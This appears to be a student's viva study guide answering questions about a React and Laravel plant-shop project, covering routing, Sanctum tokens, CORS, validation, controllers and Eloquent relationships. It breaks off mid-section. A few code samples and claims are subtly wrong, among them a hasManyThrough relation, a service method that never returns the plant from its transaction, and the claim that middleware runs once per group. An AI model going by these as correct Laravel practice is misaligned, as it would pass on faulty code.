# Nepal Cozy Care - Complete Viva Questions & Answers

**For your class viva preparation - Deep technical questions with project-specific answers**

---

## A) System & Architecture (Deep)

### Q1: Why did you choose separate React + Laravel instead of Blade only?

**Answer:**
We chose this **decoupled architecture** for several reasons:

1. **Separation of Concerns**: Frontend (React) and Backend (Laravel) can be developed independently
2. **Better User Experience**: React provides a SPA (Single Page Application) with faster navigation without page reloads
3. **API-First Design**: The same API can be used for future mobile apps or third-party integrations
4. **Modern Development**: React offers component reusability, state management, and better developer experience
5. **Scalability**: Frontend and backend can be hosted separately and scaled independently

**Blade Limitations:**
- Server-side rendering requires full page reloads
- Less interactive UI
- Harder to create complex client-side features like real-time filtering

---

### Q2: Where does the request start in Laravel, step-by-step?

**Answer - Complete Request Lifecycle:**

```
1. public/index.php (Entry Point)
   ↓
2. bootstrap/app.php (Create Application Instance)
   ↓
3. Kernel (Http/Kernel.php)
   - Loads service providers
   - Registers middleware
   ↓
4. Global Middleware (runs for ALL requests)
   - CORS
   - TrustProxies
   - HandlePrecognitiveRequests
   ↓
5. Router (routes/api.php or routes/web.php)
   - Matches URL to route
   - Determines which controller to call
   ↓
6. Route Middleware (auth:sanctum, admin, etc.)
   - Only runs if specified in route group
   - Checks authentication, authorization
   ↓
7. Controller Method (PlantController::index)
   - Business logic
   - Validation
   - Calls Model
   ↓
8. Model (Plant.php)
   - Queries database via Eloquent
   ↓
9. Database (MySQL)
   - Returns data
   ↓
10. Controller (formats response)
   ↓
11. Middleware (after logic - can modify response)
   ↓
12. Response sent to client (JSON)
```

**In our project example:**
```
Frontend: GET /api/plants
↓
public/index.php starts
↓
Kernel loads
↓
CORS middleware allows React origin
↓
routes/api.php matches GET /api/plants
↓
PlantController::index() called
↓
Plant::where('is_active', true)->get()
↓
Returns JSON response
```

---

### Q3: What is the difference between web.php routes and api.php routes?

**Answer:**

| Feature | web.php                                 | api.php |
|---------|---------|---------|
| **Purpose** | Traditional web pages (Blade views) | API endpoints (JSON responses) |
| **Middleware** | web, session, CSRF protection    | api (stateless) |
| **URL Prefix** | None (/)                         | /api |
| **Authentication** | Session-based (cookies)      | Token-based (Sanctum) |
| **CSRF Protection** | Required                    | Not required |
| **Response Type** | HTML views                    | JSON data |
| **State** | Stateful (sessions)                   | Stateless |

**In our project:**
- We use `api.php` exclusively because React frontend needs JSON data
- `web.php` is empty (not used)
- All routes are prefixed with `/api`
- We use Sanctum tokens for authentication (Bearer token)

---

### Q4: Why do APIs usually return JSON Resources instead of raw models?

**Answer:**

**Raw Model Problems:**
```php
// BAD - Returns ALL fields including sensitive data
return Plant::find($id);
// Returns: {id, name, price, created_at, updated_at, deleted_at, internal_notes...}
```

**JSON Resource Benefits:**
```php
// GOOD - Controlled output
return new PlantResource(Plant::find($id));
// Returns only: {id, name, price, image, category}
```

**Reasons:**

1. **Security**: Hide sensitive fields (passwords, internal_notes, deleted_at)
2. **Consistency**: Same format across all endpoints
3. **Transformation**: Format dates, calculate fields (e.g., full_image_url)
4. **Versioning**: Change API response without changing database
5. **Performance**: Exclude unnecessary relationships

**Example in our project:**
```php
class PlantResource extends JsonResource {
    public function toArray($request) {
        return [
            'id' => $this->id,
            'name' => $this->name,
            'price' => (float) $this->price,
            'image' => $this->image ? url("storage/{$this->image}") : null,
            'avg_rating' => round($this->reviews->avg('rating'), 1),
            // Excludes: created_at, updated_at, internal_notes
        ];
    }
}
```

**Note:** Our current implementation returns raw models, but this is what we SHOULD do in production.

---

### Q5: What's the difference between Service Layer and putting logic inside Controllers? Which is better?

**Answer:**

**Controller Logic (What we currently do):**
```php
// PlantController.php
public function store(Request $request) {
    $validated = $request->validate([...]);
    $plant = Plant::create($validated);
    return response()->json(['data' => $plant]);
}
```

**Service Layer Pattern (Better for complex apps):**
```php
// PlantController.php
public function store(Request $request) {
    $plant = $this->plantService->createPlant($request->validated());
    return response()->json(['data' => $plant]);
}

// PlantService.php
class PlantService {
    public function createPlant(array $data) {
        // Complex business logic here
        // Send notifications
        // Update inventory
        // Log activity
        return Plant::create($data);
    }
}
```

**Comparison:**

| Aspect | Controller Logic | Service Layer |
|--------|-----------------|---------------|
| **Simplicity** | ✅ Easier for small apps | ❌ More files/complexity |
| **Reusability** | ❌ Logic tied to controller | ✅ Logic reusable across controllers |
| **Testing** | ❌ Harder to test | ✅ Easy to unit test |
| **Maintenance** | ❌ Controllers become huge | ✅ Separated concerns |
| **Our Project** | ✅ We use this | Future improvement |

**When to use Service Layer:**
- Complex business logic (order checkout with stock checks, payment, email)
- Logic needed in multiple controllers
- Heavy testing requirements
- Large team projects

**Our project:** We keep logic in controllers because it's a student project with simple operations. If we had payment processing or complex order workflows, we'd use services.

---

### Q6: What is N+1 query problem and where can it happen in your project?

**Answer:**

**The Problem:**
Loading a list of items and then querying the database again for each item's relationship.

**Bad Example (N+1 Problem):**
```php
// PlantController - Getting plants with reviews
$plants = Plant::all(); // 1 query: SELECT * FROM plants

foreach ($plants as $plant) {
    $avgRating = $plant->reviews->avg('rating'); // N queries (1 per plant!)
}
// Total: 1 + N queries (if 100 plants = 101 queries!)
```

**Good Solution (Eager Loading):**
```php
// Load plants WITH reviews in ONE query
$plants = Plant::with('reviews')->get(); // 2 queries total
// Query 1: SELECT * FROM plants
// Query 2: SELECT * FROM reviews WHERE plant_id IN (1,2,3...)

foreach ($plants as $plant) {
    $avgRating = $plant->reviews->avg('rating'); // No additional query!
}
```

**Where it happens in our project:**

1. **Plants with Reviews:**
```php
// BAD
Plant::all(); // Each plant's avg_rating causes separate query

// GOOD
Plant::withAvg('reviews', 'rating')->get();
```

2. **Orders with Items:**
```php
// BAD
Order::all(); // Then accessing $order->items causes N queries

// GOOD
Order::with('items.plant')->get();
```

3. **Cart with Plant Details:**
```php
// BAD
Cart::where('user_id', $userId)->get();
// Accessing $cartItem->plant for each item = N queries

// GOOD
Cart::with('plant')->where('user_id', $userId)->get();
```

**How to detect:** Laravel Debugbar shows query count. If you see 50+ queries for one page, you have N+1 problem.

---

## B) Routes (api.php) – Advanced

### Q7: What is the difference between Route::apiResource() and defining routes manually?

**Answer:**

**Manual Definition (What we do):**
```php
Route::get('/plants', [PlantController::class, 'index']);
Route::get('/plants/{id}', [PlantController::class, 'show']);
Route::post('/plants', [PlantController::class, 'store']);
Route::put('/plants/{id}', [PlantController::class, 'update']);
Route::delete('/plants/{id}', [PlantController::class, 'destroy']);
```

**apiResource (Shorter Way):**
```php
Route::apiResource('plants', PlantController::class);
```

**This automatically creates:**

| Method | URI | Action | Route Name |
|--------|-----|--------|------------|
| GET | /plants | index | plants.index |
| GET | /plants/{plant} | show | plants.show |
| POST | /plants | store | plants.store |
| PUT/PATCH | /plants/{plant} | update | plants.update |
| DELETE | /plants/{plant} | destroy | plants.destroy |

**Differences:**

1. **Route Model Binding**: apiResource uses `{plant}` which auto-injects the model
2. **RESTful Convention**: Forces REST standards
3. **Route Names**: Auto-generates named routes
4. **Less Code**: One line vs 5 lines

**Why we use manual:**
- More control over route names
- Easier to understand for beginners
- Can mix public/protected routes easily
- Don't need all 7 REST actions

**When to use apiResource:**
- Strict REST API
- Full CRUD needed
- Large APIs with many resources

---

### Q8: Why do we group routes using middleware?

**Answer:**

**Without Grouping (Repetitive):**
```php
Route::post('/cart', [CartController::class, 'store'])->middleware('auth:sanctum');
Route::get('/cart', [CartController::class, 'index'])->middleware('auth:sanctum');
Route::put('/cart/{id}', [CartController::class, 'update'])->middleware('auth:sanctum');
Route::delete('/cart/{id}', [CartController::class, 'destroy'])->middleware('auth:sanctum');
```

**With Grouping (Clean):**
```php
Route::middleware('auth:sanctum')->group(function () {
    Route::post('/cart', [CartController::class, 'store']);
    Route::get('/cart', [CartController::class, 'index']);
    Route::put('/cart/{id}', [CartController::class, 'update']);
    Route::delete('/cart/{id}', [CartController::class, 'destroy']);
});
```

**Benefits:**

1. **DRY Principle**: Don't Repeat Yourself
2. **Readability**: Clear which routes need auth
3. **Maintainability**: Change middleware in one place
4. **Organization**: Logical grouping by permission level
5. **Performance**: Middleware runs once per group

**Our Project Grouping:**
```php
// Public routes
Route::get('/plants', ...);
Route::post('/login', ...);

// Authenticated routes
Route::middleware('auth:sanctum')->group(function () {
    Route::post('/cart', ...);
    Route::get('/orders', ...);
});

// Admin-only routes
Route::middleware(['auth:sanctum', 'admin'])->group(function () {
    Route::post('/plants', ...);
    Route::get('/admin/dashboard', ...);
});
```

---

### Q9: What is the difference between auth:sanctum and auth:api?

**Answer:**

| Feature | auth:sanctum | auth:api (Passport) |
|---------|--------------|---------------------|
| **Package** | Laravel Sanctum (built-in Laravel 11) | Laravel Passport (separate) |
| **Token Type** | Simple API tokens | OAuth2 tokens (access + refresh) |
| **Complexity** | ✅ Simple | ❌ Complex |
| **Use Case** | SPAs, mobile apps | Third-party API access |
| **Token Storage** | personal_access_tokens table | oauth_* tables |
| **Expiration** | Optional | Built-in with refresh tokens |
| **Setup** | Minimal | Requires OAuth setup |
| **Our Project** | ✅ We use this | Not needed |

**How auth:sanctum works in our project:**

1. **Login** creates token:
```php
$token = $user->createToken('auth_token')->plainTextToken;
```

2. **Token stored** in `personal_access_tokens` table

3. **Frontend** stores token in localStorage:
```js
localStorage.setItem('token', token);
```

4. **Protected requests** include token:
```js
fetch('/api/cart', {
    headers: {
        'Authorization': `Bearer ${token}`
    }
});
```

5. **Middleware** verifies token:
```php
Route::middleware('auth:sanctum')->group(function () {
    // User is authenticated here
    $user = auth()->user();
});
```

**Why we chose Sanctum:**
- Simple SPA authentication
- No need for OAuth complexity
- Built-in with Laravel 11
- Perfect for React frontend

---

### Q10: How would you version your API? (example: /api/v1/...)

**Answer:**

**Why Version APIs:**
- Breaking changes without breaking old apps
- Gradual migration for clients
- Maintain backward compatibility

**Method 1: URL Versioning (Recommended for us):**
```php
// routes/api.php
Route::prefix('v1')->group(function () {
    Route::get('/plants', [PlantController::class, 'index']);
    Route::post('/cart', [CartController::class, 'store']);
});

Route::prefix('v2')->group(function () {
    Route::get('/plants', [PlantControllerV2::class, 'index']); // New logic
});

// URLs: /api/v1/plants, /api/v2/plants
```

**Method 2: Header Versioning:**
```php
// Client sends: Accept: application/vnd.api.v1+json
Route::group(['middleware' => 'api.version:v1'], function () {
    Route::get('/plants', [PlantController::class, 'index']);
});
```

**Method 3: Subdomain:**
```php
// v1.api.nepalcozycare.com/plants
// v2.api.nepalcozycare.com/plants
```

**Best Practice for Nepal Cozy Care:**
```php
Route::prefix('v1')->name('v1.')->group(function () {
    // Auth
    Route::post('/login', [AuthController::class, 'login']);
    
    // Public
    Route::get('/plants', [PlantController::class, 'index']);
    
    // Protected
    Route::middleware('auth:sanctum')->group(function () {
        Route::post('/cart', [CartController::class, 'store']);
    });
});

// Future v2 with different response format
Route::prefix('v2')->name('v2.')->group(function () {
    Route::get('/plants', [PlantControllerV2::class, 'indexWithPagination']);
});
```

**Frontend would use:**
```js
const API = 'http://127.0.0.1:8000/api/v1';
fetch(`${API}/plants`);
```

---

### Q11: How do you handle CORS for React requests?

**Answer:**

**The Problem:**
Browser blocks requests from `http://localhost:5173` (React) to `http://127.0.0.1:8000` (Laravel) due to different origins.

**Error:**
```
Access to fetch at 'http://127.0.0.1:8000/api/plants' from origin 
'http://localhost:5173' has been blocked by CORS policy
```

**Solution in our project:**

**1. Laravel config/cors.php:**
```php
return [
    'paths' => ['api/*', 'sanctum/csrf-cookie'],
    
    'allowed_methods' => ['*'], // GET, POST, PUT, DELETE
    
    'allowed_origins' => [
        'http://localhost:5173',  // React dev server
        'http://localhost:3000',
    ],
    
    'allowed_headers' => ['*'], // Authorization, Content-Type
    
    'exposed_headers' => [],
    
    'max_age' => 0,
    
    'supports_credentials' => true, // Allow cookies/auth
];
```

**2. Middleware (automatic in Laravel 11):**
```php
// bootstrap/app.php automatically applies CORS middleware
```

**3. Frontend sends proper headers:**
```js
fetch('http://127.0.0.1:8000/api/plants', {
    headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
    }
});
```

**What CORS does:**

1. **Preflight Request** (OPTIONS):
   - Browser: "Can I make POST to /api/plants?"
   - Server: "Yes, allowed origins: localhost:5173"

2. **Actual Request**:
   - Browser makes the real request
   - Server includes CORS headers in response

**Headers Laravel sends:**
```
Access-Control-Allow-Origin: http://localhost:5173
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Authorization, Content-Type
```

**Testing CORS:**
```bash
# This will fail (different origin)
curl -H "Origin: http://evil.com" http://127.0.0.1:8000/api/plants

# This will work (allowed origin)
curl -H "Origin: http://localhost:5173" http://127.0.0.1:8000/api/plants
```

---

### Q12: What is route model binding? Example in your PlantController.

**Answer:**

**Route Model Binding** automatically resolves Eloquent models from route parameters.

**Without Route Model Binding (Manual):**
```php
// routes/api.php
Route::get('/plants/{id}', [PlantController::class, 'show']);

// PlantController.php
public function show($id) {
    $plant = Plant::find($id);
    
    if (!$plant) {
        return response()->json(['error' => 'Plant not found'], 404);
    }
    
    return response()->json(['data' => $plant]);
}
```

**With Route Model Binding (Automatic):**
```php
// routes/api.php
Route::get('/plants/{plant}', [PlantController::class, 'show']);

// PlantController.php
public function show(Plant $plant) {
    // Laravel automatically finds Plant by ID
    // If not found, returns 404 automatically
    return response()->json(['data' => $plant]);
}
```

**How it works:**

1. URL: `GET /api/plants/5`
2. Laravel sees `{plant}` parameter
3. Matches type-hinted parameter `Plant $plant`
4. Executes: `Plant::findOrFail(5)`
5. If found: injects model into method
6. If not found: automatically returns 404

**In our project (what we currently do):**
```php
// We use manual finding
Route::get('/plants/{id}', [PlantController::class, 'show']);

public function show($id) {
    $plant = Plant::find($id);
    if (!$plant) {
        return response()->json(['error' => 'Plant not found'], 404);
    }
    return response()->json(['data' => ['plant' => $plant]]);
}
```

**Better approach (route model binding):**
```php
Route::get('/plants/{plant}', [PlantController::class, 'show']);

public function show(Plant $plant) {
    return response()->json(['data' => ['plant' => $plant]]);
}
```

**Custom Key Binding:**
```php
// routes/api.php
Route::get('/plants/{plant:slug}', [PlantController::class, 'show']);
// Finds by slug column instead of ID

// URL: /api/plants/monstera-deliciosa
// Executes: Plant::where('slug', 'monstera-deliciosa')->firstOrFail()
```

**Benefits:**
- Less code
- Automatic 404 handling
- Cleaner controller methods
- Type safety

---

## C) Controllers – Deep Code & Best Practices

### Q13: Why is validation typically done in the controller (or FormRequest)?

**Answer:**

**Validation should happen EARLY in the request lifecycle:**

```
Request → Validation (STOP HERE IF INVALID) → Business Logic → Database
```

**Reasons:**

1. **Fail Fast**: Don't waste resources if data is invalid
2. **Security**: Prevent malicious data from reaching database
3. **User Feedback**: Return clear error messages immediately
4. **Data Integrity**: Ensure only valid data is processed

**Where validation can happen:**

**1. Controller Method (Simple validation):**
```php
public function store(Request $request) {
    $validated = $request->validate([
        'name' => 'required|string|max:255',
        'price' => 'required|numeric|min:0',
        'stock' => 'required|integer|min:0',
    ]);
    
    Plant::create($validated);
}
```

**2. FormRequest (Complex validation - Better):**
```php
// app/Http/Requests/StorePlantRequest.php
class StorePlantRequest extends FormRequest {
    public function rules() {
        return [
            'name' => 'required|string|max:255',
            'price' => 'required|numeric|min:0',
            'stock' => 'required|integer|min:0',
            'category' => 'required|in:Indoor,Outdoor,Succulent',
        ];
    }
    
    public function messages() {
        return [
            'name.required' => 'Plant name is required',
            'price.numeric' => 'Price must be a number',
        ];
    }
}

// Controller
public function store(StorePlantRequest $request) {
    // Already validated by the time we get here!
    Plant::create($request->validated());
}
```

**3. Model (BAD - Too late):**
```php
// DON'T DO THIS
class Plant extends Model {
    public function setNameAttribute($value) {
        if (empty($value)) {
            throw new Exception('Name required');
        }
        $this->attributes['name'] = $value;
    }
}
// Problem: Error happens during save, harder to handle
```

**Why Controller/FormRequest:**
- ✅ Catches errors before processing
- ✅ Returns proper HTTP 422 status
- ✅ Returns validation errors in standard format
- ✅ Easier to test

---

### Q14: Difference between Request $request->validate() vs FormRequest classes?

**Answer:**

**Method 1: Inline Validation (Simple):**
```php
// PlantController.php
public function store(Request $request) {
    $validated = $request->validate([
        'name' => 'required|string',
        'price' => 'required|numeric',
    ]);
    
    Plant::create($validated);
}
```

**Method 2: FormRequest (Professional):**
```php
// app/Http/Requests/StorePlantRequest.php
class StorePlantRequest extends FormRequest {
    public function authorize() {
        return true; // Or check permissions
    }
    
    public function rules() {
        return [
            'name' => 'required|string',
            'price' => 'required|numeric',
        ];
    }
}

// PlantController.php
public function store(StorePlantRequest $request) {
    Plant::create($request->validated());
}
```

**Comparison:**

| Feature | $request->validate() | FormRequest |
|---------|---------------------|-------------|
| **Location** | Inside controller | Separate file |
| **Reusability** | ❌ Copy-paste needed | ✅ Reusable |
| **Authorization** | Manual | Built-in authorize() |
| **Custom Messages** | Harder | Easy messages() method |
| **Custom Attributes** | Harder | Easy attributes() method |
| **Testing** | Test controller | Test request separately |
| **Controller Size** | ❌ Gets bloated | ✅ Stays thin |
| **Our Project** | ✅ We use this | Should upgrade to this |

**Example where FormRequest shines:**

```php
// StorePlantRequest.php
class StorePlantRequest extends FormRequest {
    public function authorize() {
        // Only admin can create plants
        return auth()->user()->role === 'admin';
    }
    
    public function rules() {
        return [
            'name' => 'required|string|max:255|unique:plants,name',
            'scientific_name' => 'nullable|string|max:255',
            'price' => 'required|numeric|min:0|max:999999',
            'stock' => 'required|integer|min:0',
            'category' => 'required|in:Indoor,Outdoor,Succulent,Flowering',
            'difficulty' => 'required|in:Easy,Medium,Hard',
            'light' => 'required|in:Low Light,Medium Light,Bright Light',
            'image' => 'nullable|image|mimes:jpeg,png,jpg|max:2048',
        ];
    }
    
    public function messages() {
        return [
            'name.required' => 'Please enter a plant name',
            'name.unique' => 'This plant already exists',
            'price.min' => 'Price cannot be negative',
            'image.max' => 'Image must be less than 2MB',
        ];
    }
    
    public function attributes() {
        return [
            'scientific_name' => 'botanical name',
        ];
    }
    
    protected function prepareForValidation() {
        // Modify data before validation
        $this->merge([
            'price' => floatval($this->price),
            'slug' => Str::slug($this->name),
        ]);
    }
}
```

**When to use what:**

- **Inline validation**: Quick APIs, simple validation, learning projects (our case)
- **FormRequest**: Production apps, complex validation, team projects

---

### Q15: How do you avoid repeating validation rules across controllers?

**Answer:**

**Problem (Repetition):**
```php
// PlantController store
$request->validate([
    'name' => 'required|string|max:255',
    'price' => 'required|numeric|min:0',
]);

// PlantController update
$request->validate([
    'name' => 'required|string|max:255',  // Same rules!
    'price' => 'required|numeric|min:0',
]);
```

**Solution 1: Shared FormRequest:**
```php
// StorePlantRequest.php
class StorePlantRequest extends FormRequest {
    public function rules() {
        return [
            'name' => 'required|string|max:255',
            'price' => 'required|numeric|min:0',
        ];
    }
}

// UpdatePlantRequest.php
class UpdatePlantRequest extends StorePlantRequest {
    public function rules() {
        return array_merge(parent::rules(), [
            'name' => 'sometimes|required|string|max:255', // Add 'sometimes'
        ]);
    }
}
```

**Solution 2: Custom Rule Class:**
```php
// app/Rules/ValidPlantData.php
class ValidPlantData {
    public static function rules() {
        return [
            'name' => 'required|string|max:255',
            'price' => 'required|numeric|min:0',
            'stock' => 'required|integer|min:0',
        ];
    }
}

// Controller
$request->validate(ValidPlantData::rules());
```

**Solution 3: Model Rules (Not recommended but possible):**
```php
// Plant.php
class Plant extends Model {
    public static function validationRules() {
        return [
            'name' => 'required|string|max:255',
            'price' => 'required|numeric|min:0',
        ];
    }
}

// Controller
$request->validate(Plant::validationRules());
```

**Solution 4: Trait (For truly shared rules):**
```php
// app/Traits/ValidatesPlants.php
trait ValidatesPlants {
    protected function plantRules() {
        return [
            'name' => 'required|string|max:255',
            'price' => 'required|numeric|min:0',
        ];
    }
}

// PlantController.php
class PlantController extends Controller {
    use ValidatesPlants;
    
    public function store(Request $request) {
        $request->validate($this->plantRules());
    }
}
```

**Best Practice:**
Use **FormRequests** for each endpoint, but extract common rules into protected methods:

```php
// BaseFormRequest.php
class BaseFormRequest extends FormRequest {
    protected function imageRules() {
        return 'nullable|image|mimes:jpeg,png,jpg|max:2048';
    }
    
    protected function priceRules() {
        return 'required|numeric|min:0|max:999999';
    }
}

// StorePlantRequest.php
class StorePlantRequest extends BaseFormRequest {
    public function rules() {
        return [
            'name' => 'required|string|max:255',
            'price' => $this->priceRules(),
            'image' => $this->imageRules(),
        ];
    }
}
```

---

### Q16: How do you handle exceptions in controllers? (try/catch vs global handler)

**Answer:**

**Method 1: Try-Catch in Controller (Specific handling):**
```php
public function store(Request $request) {
    try {
        $plant = Plant::create($request->validated());
        return response()->json(['data' => $plant], 201);
        
    } catch (\Illuminate\Database\QueryException $e) {
        // Database error (duplicate entry, etc.)
        return response()->json([
            'error' => 'Failed to create plant',
            'message' => 'Database error occurred'
        ], 500);
        
    } catch (\Exception $e) {
        // Any other error
        \Log::error('Plant creation failed: ' . $e->getMessage());
        return response()->json([
            'error' => 'Server error'
        ], 500);
    }
}
```

**Method 2: Global Exception Handler (Cleaner):**
```php
// app/Exceptions/Handler.php
public function register() {
    $this->renderable(function (ModelNotFoundException $e, $request) {
        if ($request->expectsJson()) {
            return response()->json([
                'error' => 'Resource not found'
            ], 404);
        }
    });
    
    $this->renderable(function (ValidationException $e, $request) {
        return response()->json([
            'error' => 'Validation failed',
            'errors' => $e->errors()
        ], 422);
    });
    
    $this->renderable(function (\Exception $e, $request) {
        if ($request->expectsJson()) {
            return response()->json([
                'error' => 'Server error',
                'message' => app()->isLocal() ? $e->getMessage() : 'Something went wrong'
            ], 500);
        }
    });
}

// Controller (clean!)
public function store(Request $request) {
    $plant = Plant::create($request->validated());
    return response()->json(['data' => $plant], 201);
    // Exceptions automatically handled globally
}
```

**Our Project (what we do):**
```php
// We use minimal error handling
public function show($id) {
    $plant = Plant::find($id);
    
    if (!$plant) {
        return response()->json(['error' => 'Plant not found'], 404);
    }
    
    return response()->json(['data' => ['plant' => $plant]]);
}
```

**Best Practice (Should implement):**
```php
// Use findOrFail + global handler
public function show($id) {
    $plant = Plant::findOrFail($id); // Throws ModelNotFoundException
    return response()->json(['data' => ['plant' => $plant]]);
}

// Global handler catches it
```

**When to use try-catch in controller:**
- Database transactions
- External API calls
- File operations
- Specific business logic errors

**When to use global handler:**
- Standard errors (404, 422, 500)
- Consistent error format
- Logging
- Production error messages

---

### Q17: Why should controllers stay "thin"? What problems happen if controllers become huge?

**Answer:**

**Thin Controller (Good):**
```php
// PlantController.php
public function store(StorePlantRequest $request) {
    $plant = $this->plantService->createPlant($request->validated());
    return new PlantResource($plant);
}
// 3 lines - focused on HTTP layer
```

**Fat Controller (Bad):**
```php
public function store(Request $request) {
    // Validation (20 lines)
    $validated = $request->validate([...]);
    
    // File upload (15 lines)
    if ($request->hasFile('image')) {
        $image = $request->file('image');
        $path = $image->store('plants', 'public');
        $validated['image'] = $path;
    }
    
    // Business logic (30 lines)
    $plant = Plant::create($validated);
    
    // Update inventory system
    InventoryService::register($plant);
    
    // Send notifications
    Notification::send(User::where('role', 'admin')->get(), 
        new PlantCreatedNotification($plant));
    
    // Log activity
    ActivityLog::create([
        'user_id' => auth()->id(),
        'action' => 'plant_created',
        'plant_id' => $plant->id,
    ]);
    
    // Update cache
    Cache::forget('plants_list');
    Cache::remember('plant_' . $plant->id, 3600, function() use ($plant) {
        return $plant;
    });
    
    // Format response (10 lines)
    return response()->json([
        'data' => [
            'plant' => [
                'id' => $plant->id,
                'name' => $plant->name,
                'price' => number_format($plant->price, 2),
                // ... more formatting
            ]
        ]
    ], 201);
}
// 100+ lines - hard to maintain!
```

**Problems with fat controllers:**

1. **Hard to Test**: Must mock everything in one test
2. **Hard to Reuse**: Logic locked in controller
3. **Hard to Read**: Scroll forever to understand
4. **Hard to Debug**: Too many responsibilities
5. **Team Conflicts**: Multiple developers edit same file
6. **Violates SRP**: (Single Responsibility Principle)

**Solution (Thin Controller with services):**
```php
// PlantController.php (Thin)
public function store(StorePlantRequest $request) {
    $plant = $this->plantService->createPlant(
        $request->validated(),
        $request->file('image')
    );
    
    return new PlantResource($plant);
}
// 5 lines!

// PlantService.php (Business Logic)
class PlantService {
    public function createPlant(array $data, $image = null) {
        DB::transaction(function() use ($data, $image) {
            if ($image) {
                $data['image'] = $this->imageService->store($image);
            }
            
            $plant = Plant::create($data);
            
            $this->notificationService->notifyAdmins($plant);
            $this->activityService->log('plant_created', $plant);
            $this->cacheService->forgetPlantsCache();
            
            return $plant;
        });
    }
}

// ImageService.php (File Handling)
// NotificationService.php (Notifications)
// ActivityService.php (Logging)
// CacheService.php (Caching)
```

**What controller SHOULD do (HTTP layer only):**
- Receive request
- Validate input (or delegate to FormRequest)
- Call service/repository
- Format response
- Handle HTTP status codes

**What controller should NOT do:**
- Database queries (use Repository/Model)
- Business logic (use Service)
- File operations (use Service)
- Sending emails (use Service/Job)
- Complex calculations (use Service)

**Our project:** Controllers are relatively thin, but could be thinner with services for complex operations like checkout.

---

### Q18: Explain difference between: Plant::create($data) vs $plant = new Plant(); $plant->save();

**Answer:**

**Method 1: create() - Mass Assignment:**
```php
$plant = Plant::create([
    'name' => 'Monstera',
    'price' => 1500,
    'stock' => 10,
]);
```

**Method 2: new + save() - Manual Assignment:**
```php
$plant = new Plant();
$plant->name = 'Monstera';
$plant->price = 1500;
$plant->stock = 10;
$plant->save();
```

**Detailed Comparison:**

| Aspect | create() | new + save() |
|--------|----------|--------------|
| **Code Length** | ✅ 1 line | ❌ 5+ lines |
| **Mass Assignment** | ✅ Yes (array) | ❌ No (one-by-one) |
| **fillable Required** | ✅ YES | ❌ No |
| **Returns Model** | ✅ Yes | ✅ Yes |
| **Database Hit** | ✅ 1 INSERT | ✅ 1 INSERT |
| **When to Use** | Multiple fields | Few fields / conditional |

**Mass Assignment Protection:**

```php
// Plant.php
class Plant extends Model {
    protected $fillable = [
        'name', 'price', 'stock', 'image'
    ];
    
    // OR
    
    protected $guarded = ['id', 'created_at', 'updated_at'];
}
```

**create() will FAIL without fillable:**
```php
// Without $fillable defined
Plant::create(['name' => 'Monstera']);
// Error: MassAssignmentException
```

**new + save() works without fillable:**
```php
$plant = new Plant();
$plant->name = 'Monstera'; // Works!
$plant->save();
```

**When to use create():**
- Multiple fields
- Data from form/API request
- Cleaner code
```php
Plant::create($request->validated());
```

**When to use new + save():**
- Conditional assignment
- Calculated fields
- Need model instance before save
```php
$plant = new Plant();
$plant->name = $request->name;
$plant->slug = Str::slug($request->name);
$plant->price = $this->calculatePrice($request->base_price);
if ($request->hasFile('image')) {
    $plant->image = $request->file('image')->store('plants');
}
$plant->save();
```

**Both methods trigger:**
- Model events (creating, created, saving, saved)
- Observers
- Timestamps (created_at, updated_at)

**In our project:**
We use `create()` because it's cleaner and works well with validated data from requests.

---

## D) Eloquent Models & Relationships (Most Asked)

### Q19: Explain relationship between: User and Orders / Order and OrderItems / Plant and Reviews / User and Wishlist

**Answer:**

**1. User → Orders (One-to-Many)**

```php
// User.php
class User extends Model {
    public function orders() {
        return $this->hasMany(Order::class);
    }
}

// Order.php
class Order extends Model {
    public function user() {
        return $this->belongsTo(User::class);
    }
}

// Usage
$user = User::find(1);
$orders = $user->orders; // Get all orders by this user

$order = Order::find(1);
$customer = $order->user; // Get the customer who made this order
```

**Database:**
```
users table: id, name, email
orders table: id, user_id (FK), status, total
```

**Explanation:**
- One user can have many orders
- Each order belongs to one user
- Foreign key `user_id` in orders table points to users.id

---

**2. Order → OrderItems (One-to-Many)**

```php
// Order.php
class Order extends Model {
    public function items() {
        return $this->hasMany(OrderItem::class);
    }
    
    public function plants() {
        return $this->hasManyThrough(Plant::class, OrderItem::class);
    }
}

// OrderItem.php
class OrderItem extends Model {
    public function order() {
        return $this->belongsTo(Order::class);
    }
    
    public function plant() {
        return $this->belongsTo(Plant::class);
    }
}

// Usage
$order = Order::with('items.plant')->find(1);
foreach ($order->items as $item) {
    echo $item->plant->name; // "Monstera"
    echo $item->quantity;    // 2
    echo $item->price;       // 1500
    echo $item->line_total;  // 3000
}
```

**Database:**
```
orders table: id, user_id, status, total
order_items table: id, order_id (FK), plant_id (FK), quantity, price, line_total
plants table: id, name, price, stock
```

**Explanation:**
- One order can have many items (order_items)
- Each order item belongs to one order
- OrderItem is the **pivot/intermediate** table connecting Orders and Plants
- We store price snapshot in order_items (not reference plants.price) because price can change

---

**3. Plant → Reviews (One-to-Many)**

```php
// Plant.php
class Plant extends Model {
    public function reviews() {
        return $this->hasMany(Review::class);
    }
    
    public function averageRating() {
        return $this->reviews()->avg('rating');
    }
}

// Review.php
class Review extends Model {
    public function plant() {
        return $this->belongsTo(Plant::class);
    }
    
    public function user() {
        return $this->belongsTo(User::class);
    }
}

// Usage
$plant = Plant::withAvg('reviews', 'rating')->find(1);
echo $plant->reviews_avg_rating; // 4.5

$reviews = $plant->reviews()->with('user')->get();
foreach ($reviews as $review) {
    echo $review->user->name;  // "John Doe"
    echo $review->rating;       // 5
    echo $review->comment;      // "Great plant!"
}
```

**Database:**
```
plants table: id, name, price
reviews table: id, user_id (FK), plant_id (FK), rating, comment
```

**Explanation:**
- One plant can have many reviews
- Each review belongs to one plant and one user
- We calculate average rating from all reviews

---

**4. User → Wishlist (Many-to-Many through pivot)**

```php
// User.php
class User extends Model {
    public function wishlist() {
        return $this->belongsToMany(Plant::class, 'wishlists')
                    ->withTimestamps();
    }
}

// Plant.php
class Plant extends Model {
    public function wishlistedBy() {
        return $this->belongsToMany(User::class, 'wishlists')
                    ->withTimestamps();
    }
}

// Wishlist.php (optional dedicated model)
class Wishlist extends Model {
    public function user() {
        return $this->belongsTo(User::class);
    }
    
    public function plant() {
        return $this->belongsTo(Plant::class);
    }
}

// Usage
// Add to wishlist
$user->wishlist()->attach($plantId);

// Remove from wishlist
$user->wishlist()->detach($plantId);

// Check if in wishlist
